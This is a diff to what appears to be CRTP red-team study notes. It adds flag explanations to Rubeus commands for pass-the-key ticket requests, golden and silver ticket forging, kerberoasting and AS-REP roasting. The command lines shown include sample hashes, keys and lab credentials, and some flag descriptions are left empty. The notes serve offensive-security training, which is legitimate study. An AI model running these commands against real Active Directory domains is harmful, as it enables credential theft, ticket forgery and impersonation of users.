@@ -487,7 +487,7 @@ Request ticket (TGT) based on username and password/hash:
 ```
 Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
 ```
-- [from previous section](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-overpasspass-the-key)
+- [from latmove opth previous section](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus-overpasspass-the-key)
 
 Request Service ticket (TGS) based on Service Name:
 ```
@@ -499,11 +499,28 @@ Hash of a user:
 ```rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1```
 
 Golden:
+
+optional:
+- ```/ldap``` - fetch details for user identity you are forging to better impersonate
+- ```/printcmd``` - oneliner based on those full details to forge same ticket later
+- ```/domain``` - specify domain
+- ```/ptt``` - inject ticket
+
 ```
 rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:FakeUser123 /printcmd
 ```
 
 Silver:
+
+optional:
+- ```/ldap``` - fetch details for user identity you are forging to better impersonate
+- ```/creduser``` -
+- ```/credpassword``` -
+- ```/krbkey``` - 
+- ```/krbenctype``` - 
+- ```/domain``` - specify domain
+- ```/ptt``` - inject ticket
+
 ```
 rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt
 ```
@@ -748,6 +765,7 @@ https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
 
 ```.\Rubeus.exe kerberoast```
 
+optional:
 - ```/spn:```
 - ```/tgtdeleg``` - used to perform the tgt delegation trick to roast all rc4 enabled accounts
 - ```/aes``` - roast all AES enabled accounts while using KerberosRequestorSecurityToken
@@ -801,6 +819,8 @@ OR Find-InterestingDomainAcl shows us all interesting ACLs modifiable by the cur
 #### Get AS-REPs
 
 ```.\Rubeus.exe asreproast```
+
+optional:
 
 - ```/domain:``` - specify domain/dc
 - ```/dc:```
